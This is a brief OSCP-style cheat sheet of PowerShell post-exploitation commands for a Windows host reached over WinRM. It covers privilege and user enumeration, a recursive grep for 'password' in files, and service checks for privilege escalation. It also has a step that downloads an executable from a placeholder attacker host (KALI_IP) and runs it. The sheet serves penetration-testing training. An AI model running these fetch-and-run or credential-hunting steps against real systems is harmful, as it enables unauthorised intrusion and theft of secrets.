# PowerShell — Post-Access Commands (OSCP)

PowerShell is your **main weapon after WinRM**.
It’s used for **enumeration, file ops, execution, and privilege escalation**.


### **Drop into CMD from PowerShell**
```powershell
cmd.exe
```

To go back to PowerShell:
```cmd
exit
```

## **Identity & Privileges**
```powershell
whoami                 # current user
whoami /priv           # privileges (SeImpersonate, etc.)
whoami /groups         # group membership
```

## **Users & Groups**
```powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
```

## **File System Navigation**
```powershell
pwd                    # current directory
ls                     # list files
cd path                # change directory
tree /f                # full directory tree (CMD-style)
```

Search for files:
```powershell
Get-ChildItem -Recurse -ErrorAction SilentlyContinue
```
Search for passwords:
```powershell
Get-ChildItem -Recurse -ErrorAction SilentlyContinue |
Select-String "password"
```



##  **Read the File Properly**
```powershell
type web.config
```
for smaller files 

```powershell
Get-Content web.config
```
for bigger files



## **File Transfer**
Download File
```powershell
Invoke-WebRequest http://KALI_IP/file.exe -OutFile file.exe
```
Run it:
```powershell
.\file.exe
```


## **Process & Services**
```powershell
Get-Process
Get-Service
```

Check writable services (CMD often easier):
```
sc qc ServiceName
```